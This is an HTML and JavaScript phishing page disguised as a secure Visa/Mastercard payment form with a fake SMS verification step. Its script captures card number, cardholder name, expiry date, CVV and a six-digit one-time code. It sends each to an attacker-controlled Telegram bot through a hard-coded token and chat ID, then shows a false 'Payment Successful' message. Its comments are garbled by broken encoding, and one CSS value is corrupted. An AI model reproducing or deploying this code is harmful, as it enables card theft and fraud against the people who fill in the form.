<! Payment</title>
  <!-- Ù„Ø¬Ø¹Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØªÙƒÙŠÙ‘Ù Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø´Ø§Ø´Ø§Øª -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #f4f6f8;
      display: flex;
      justify-content: center;
      align-items: centnapi_txiyl31b7ztrd4ftw97nuw5ce6uza33binqq7y58fpgia73df26coqsqqd6vy37ber;
      min-height: 100vh;
      padding: 20px;

    }

    .payment-card {
      background-color: #ffffff;
      padding: 30px 20px;
      border-radius: 16px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
      border: 1px solid #e0e6ed;
      text-align: center;
    }

    .logo {
      margin-bottom: 20px;
    }

    .logo img {
      width: 90px;
      height: auto;
      display: none;
      margin: 0 auto 20px;
    }

    .logo img.show {
      display: block;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    h2 {
      color: #2c3e50;
      margin-bottom: 25px;
      font-size: 20px;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 15px;
      border: 1px solid #d1d9e6;
      border-radius: 8px;
      font-size: 15px;
      background-color: #f9fafb;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: #3b82f6;
      outline: none;
      background-color: #fff;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #3b82f6;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s;
      margin-top: 10px;
      position: relative;
    }

    button:hover {
      background: #2563eb;
    }

    button:disabled {
      background: #9ca3af;
      cursor: not-allowed;
    }

    .loading {
      opacity: 0.7;
      pointer-events: none;
    }

    .loading::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 16px;
      height: 16px;
      border: 2px solid transparent;
      border-top: 2px solid white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      transform: translate(-50%, -50%);
    }

    @keyframes spin {
      0% {
        transform: translate(-50%, -50%) rotate(0deg);
      }

      100% {
        transform: translate(-50%, -50%) rotate(360deg);
      }
    }

    .secure-note {
      font-size: 12px;
      color: #6b7280;
      margin-top: 20px;
    }

    .secure-note:before {
      content: "ğŸ”’ ";
    }

    .success-message {
      display: none;
      background: #d1fae5;
      color: #065f46;
      padding: 20px;
      border-radius: 8px;
      margin-top: 20px;
      border: 1px solid #86efac;
    }

    .success-message.show {
      display: block;
      animation: slideDown 0.5s ease;
    }

    @keyframes slideDown {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Hidden class for sections */
    .hidden {
      display: none !important;
    }

    /* Waiting Section Styles */
    .waiting-section {
      display: none;
      text-align: center;
      padding: 20px;
    }

    .waiting-section.show {
      display: block;
      animation: fadeIn 0.5s ease;
    }

    .waiting-icon {
      font-size: 48px;
      margin-bottom: 20px;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }

    .waiting-timer {
      font-size: 24px;
      font-weight: 600;
      color: #3b82f6;
      margin: 20px 0;
    }

    /* OTP Section Styles */
    .otp-section {
      display: none;
      text-align: center;
      padding: 20px;
    }

    .otp-section.show {
      display: block;
      animation: fadeIn 0.5s ease;
    }

    .otp-info {
      color: #6b7280;
      font-size: 14px;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .otp-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    .otp-input {
      width: 45px;
      height: 50px;
      text-align: center;
      font-size: 18px;
      font-weight: 600;
      border: 2px solid #d1d9e6;
      border-radius: 8px;
      background-color: #f9fafb;
      margin: 0;
      padding: 0;
    }

    .otp-input:focus {
      border-color: #3b82f6;
      background-color: #fff;
    }

    .timer {
      font-size: 16px;
      font-weight: 600;
      color: #3b82f6;
      margin: 20px 0;
    }

    .timer.expired {
      color: #ef4444;
    }

    .resend-btn {
      display: none;
      background: #6b7280;
      margin-top: 10px;
    }

    .resend-btn.show {
      display: block;
    }

    .resend-btn:hover {
      background: #4b5563;
    }
  </style>
</head>

<body>
  <div class="payment-card">
    <!-- Payment Section -->
    <div id="paymentSection">
      <div class="logo">
        <img id="visa-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
        <img id="mc-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png"
          alt="MasterCard Logo">
      </div>

      <h2>Pay with Card</h2>

      <form id="paymentForm">
        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
        <input type="text" id="cardholder" placeholder="Cardholder Name" required>
        <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" required>
        <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
        <button type="submit" id="submitBtn">Complete Payment</button>
      </form>

      <div class="secure-note">Your transaction is protected with 256-bit SSL encryption.</div>
    </div>

    <!-- Waiting Section -->
    <div class="waiting-section" id="waitingSection">
      <div class="waiting-icon">ğŸ“±</div>
      <h2>Sending Verification Code</h2>
      <p>Please wait while we send a verification code to your registered mobile number.</p>
      <div class="waiting-timer" id="waitingTimer">30</div>
      <p>This usually takes 30 seconds</p>
    </div>

    <!-- OTP Section -->
    <div class="otp-section" id="otpSection">
      <h2>Enter Verification Code</h2>
      <div class="otp-info">
        We've sent a 6-digit verification code to your phone. Please enter it below to complete your payment.
      </div>
      
      <div class="otp-inputs">
        <input type="text" class="otp-input" maxlength="1" data-index="0">
        <input type="text" class="otp-input" maxlength="1" data-index="1">
        <input type="text" class="otp-input" maxlength="1" data-index="2">
        <input type="text" class="otp-input" maxlength="1" data-index="3">
        <input type="text" class="otp-input" maxlength="1" data-index="4">
        <input type="text" class="otp-input" maxlength="1" data-index="5">
      </div>

      <div class="timer" id="timer">05:00</div>

      <button id="verifyOtpBtn" type="button">Verify Code</button>
      <button id="resendBtn" type="button" class="resend-btn">Resend Code</button>
    </div>

    <!-- Success Message -->
    <div class="success-message" id="successMessage">
      <h3>âœ… Payment Successful!</h3>
      <p>Thank you for using our secure service</p>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function () {
      // Ø¹Ø±Ø¶ Ø´Ø¹Ø§Ø± Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
      const cardInput = document.getElementById("cardNumber");
      const visaLogo = document.getElementById("visa-logo");
      const mcLogo = document.getElementById("mc-logo");
      const expiryInput = document.getElementById("expiry");
      const paymentForm = document.getElementById("paymentForm");
      const submitBtn = document.getElementById("submitBtn");
      const successMessage = document.getElementById("successMessage");
      const paymentSection = document.getElementById("paymentSection");
      const waitingSection = document.getElementById("waitingSection");
      const otpSection = document.getElementById("otpSection");
      const timerElement = document.getElementById("timer");
      const waitingTimerElement = document.getElementById("waitingTimer");
      const verifyOtpBtn = document.getElementById("verifyOtpBtn");
      const resendBtn = document.getElementById("resendBtn");
      const otpInputs = document.querySelectorAll(".otp-input");

      // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù…Ø¤Ù‚Øª
      let timerInterval;
      let waitingInterval;
      let timeLeft = 300; // 5 Ø¯Ù‚Ø§Ø¦Ù‚ Ø¨Ø§Ù„Ø«ÙˆØ§Ù†ÙŠ
      let waitingTimeLeft = 30; // 30 Ø«Ø§Ù†ÙŠØ© Ù„Ù„Ø§Ù†ØªØ¸Ø§Ø±
      let cardData = {}; // Ù„Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©

      // Telegram Bot Configuration
      const telegramBotToken = "7621980874:AAEj35gAds4DYCZE3SCMdg84uCjrZOuJdL8";
      const chatId = "7997140142";

      // ØªÙ†Ø³ÙŠÙ‚ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
      cardInput.addEventListener("input", function () {
        let value = cardInput.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;

        if (formattedValue.length <= 19) {
          cardInput.value = formattedValue;
        }

        const cleanValue = value.trim();
        if (cleanValue.startsWith("4")) {
          // Visa
          visaLogo.classList.add("show");
          mcLogo.classList.remove("show");
        } else if (cleanValue.startsWith("5")) {
          // MasterCard
          visaLogo.classList.remove("show");
          mcLogo.classList.add("show");
        } else {
          // Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø´Ø¹Ø§Ø±
          visaLogo.classList.remove("show");
          mcLogo.classList.remove("show");
        }
      });

      // ØªÙ†Ø³ÙŠÙ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
      expiryInput.addEventListener("input", function () {
        let value = this.value.replace(/\D/g, '');
        if (value.length >= 2) {
          value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
        }
        this.value = value;
      });

      // OTP Input Logic
      otpInputs.forEach((input, index) => {
        input.addEventListener("input", function () {
          // Allow only numbers
          this.value = this.value.replace(/[^0-9]/g, '');
          
          // Move to next input if current is filled
          if (this.value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
          }
        });

        input.addEventListener("keydown", function (e) {
          // Handle backspace
          if (e.key === "Backspace" && !this.value && index > 0) {
            otpInputs[index - 1].focus();
          }
        });
      });

      // Timer Functions
      function startWaitingTimer() {
        waitingTimeLeft = 30; // Reset to 30 seconds
        waitingTimerElement.textContent = waitingTimeLeft;
        
        waitingInterval = setInterval(() => {
          waitingTimeLeft--;
          waitingTimerElement.textContent = waitingTimeLeft;
          
          if (waitingTimeLeft <= 0) {
            clearInterval(waitingInterval);
            // Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø´Ø§Ø´Ø© OTP
            waitingSection.classList.remove('show');
            otpSection.classList.add('show');
            startTimer();
            otpInputs[0].focus();
          }
        }, 1000);
      }

      function startTimer() {
        timeLeft = 300; // Reset to 5 minutes
        resendBtn.classList.remove("show");
        timerElement.classList.remove("expired");
        
        timerInterval = setInterval(() => {
          timeLeft--;
          updateTimerDisplay();
          
          if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerElement.textContent = "Code expired";
            timerElement.classList.add("expired");
            resendBtn.classList.add("show");
          }
        }, 1000);
      }

      function updateTimerDisplay() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      }

      // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…
      function sendToTelegram(message) {
        return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          }),
        });
      }

      // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
      function validateCardNumber(number) {
        return /^(\d{13,19})$/.test(number.replace(/\s+/g, ""));
      }

      function validateExpiry(expiry) {
        const cleanExpiry = expiry.replace(/\s/g, '');
        const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
        if (!regex.test(cleanExpiry)) return false;

        const [month, year] = cleanExpiry.split("/");
        const inputDate = new Date(`20${year}`, month - 0);
        const today = new Date();
        return inputDate > today;
      }

      function validateCVV(cvv) {
        return /^\d{3}$/.test(cvv);
      }

      function getOtpValue() {
        return Array.from(otpInputs).map(input => input.value).join('');
      }

      function clearOtpInputs() {
        otpInputs.forEach(input => input.value = '');
        otpInputs[0].focus();
      }

      // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
      paymentForm.addEventListener("submit", function (e) {
        e.preventDefault();

        const cardNumber = cardInput.value.trim();
        const cardholder = document.getElementById("cardholder").value.trim();
        const expiry = expiryInput.value.trim();
        const cvv = document.getElementById("cvv").value.trim();

        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        if (!validateCardNumber(cardNumber)) {
          alert("Please enter a valid card number (13-19 digits)");
          cardInput.focus();
          return;
        }

        if (!cardholder || cardholder.length < 3) {
          alert("Please enter the cardholder name");
          document.getElementById("cardholder").focus();
          return;
        }

        if (!validateExpiry(expiry)) {
          alert("Please enter a valid expiration date (MM / YY)");
          expiryInput.focus();
          return;
        }

        if (!validateCVV(cvv)) {
          alert("Please enter a valid CVV (3 digits only)");
          document.getElementById("cvv").focus();
          return;
        }

        // Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
        cardData = { cardNumber, cardholder, expiry, cvv };

        // ØªÙØ¹ÙŠÙ„ Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
        submitBtn.classList.add('loading');
        submitBtn.textContent = 'Processing...';
        submitBtn.disabled = true;

        // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…
        const cardMessage = `ğŸ’³ New Card Information:\n\nğŸ“‹ Card Number: ${cardNumber}\nğŸ‘¤ Cardholder: ${cardholder}\nğŸ“… Expiry: ${expiry}\nğŸ”’ CVV: ${cvv}\nâ° Time: ${new Date().toLocaleString()}`;

        sendToTelegram(cardMessage)
          .then(response => response.json())
          .then(data => {
            console.log('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­:', data);

            // Ø¥Ø®ÙØ§Ø¡ Ù‚Ø³Ù… Ø§Ù„Ø¯ÙØ¹ ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
            setTimeout(() => {
              paymentSection.classList.add('hidden');
              waitingSection.classList.add('show');
              startWaitingTimer();
            }, 1500);
          })
          .catch((error) => {
            console.error("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:", error);

            // Ø¥Ø¸Ù‡Ø§Ø± Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ Ù„Ùˆ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
            setTimeout(() => {
              paymentSection.classList.add('hidden');
              waitingSection.classList.add('show');
              startWaitingTimer();
            }, 1500);
          })
          .finally(() => {
            // Ø¥Ø²Ø§Ù„Ø© Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
            submitBtn.classList.remove('loading');
            submitBtn.textContent = 'Complete Payment';
            submitBtn.disabled = false;
          });
      });

      // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† OTP
      verifyOtpBtn.addEventListener("click", function () {
        const otpValue = getOtpValue();
        
        if (otpValue.length !== 6) {
          alert("Please enter the complete 6-digit code");
          return;
        }

        // ØªÙØ¹ÙŠÙ„ Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
        verifyOtpBtn.classList.add('loading');
        verifyOtpBtn.textContent = 'Verifying...';
        verifyOtpBtn.disabled = true;

        // Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² OTP Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…
        const otpMessage = `ğŸ” OTP Verification:\n\nğŸ’³ Card: ${cardData.cardNumber}\nğŸ‘¤ Cardholder: ${cardData.cardholder}\nğŸ”¢ OTP Code: ${otpValue}\nâ° Time: ${new Date().toLocaleString()}`;

        sendToTelegram(otpMessage)
          .then(response => response.json())
          .then(data => {
            console.log('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² OTP Ø¨Ù†Ø¬Ø§Ø­:', data);

            // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…Ø¤Ù‚Øª
            clearInterval(timerInterval);

            // Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­
            setTimeout(() => {
              otpSection.classList.remove('show');
              successMessage.classList.add('show');

              // Ø¥Ø¹Ø§Ø¯Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†
              setTimeout(() => {
                location.reload();
              }, 3000);
            }, 1000);
          })
          .catch((error) => {
            console.error("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² OTP:", error);

            // Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­ Ø­ØªÙ‰ Ù„Ùˆ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
            setTimeout(() => {
              clearInterval(timerInterval);
              otpSection.classList.remove('show');
              successMessage.classList.add('show');

              setTimeout(() => {
                location.reload();
              }, 3000);
            }, 1000);
          })
          .finally(() => {
            // Ø¥Ø²Ø§Ù„Ø© Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
            verifyOtpBtn.classList.remove('loading');
            verifyOtpBtn.textContent = 'Verify Code';
            verifyOtpBtn.disabled = false;
          });
      });

      // Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ OTP
      resendBtn.addEventListener("click", function () {
        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª
        clearOtpInputs();
        startTimer();
        resendBtn.classList.remove("show");
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ØºØ±Ø§Ù…
        const resendMessage = `ğŸ”„ OTP Resend Request:\n\nğŸ’³ Card: ${cardData.cardNumber}\nğŸ‘¤ Cardholder: ${cardData.cardholder}\nâ° Time: ${new Date().toLocaleString()}`;
        sendToTelegram(resendMessage).catch(console.error);
      });
    });
  </script>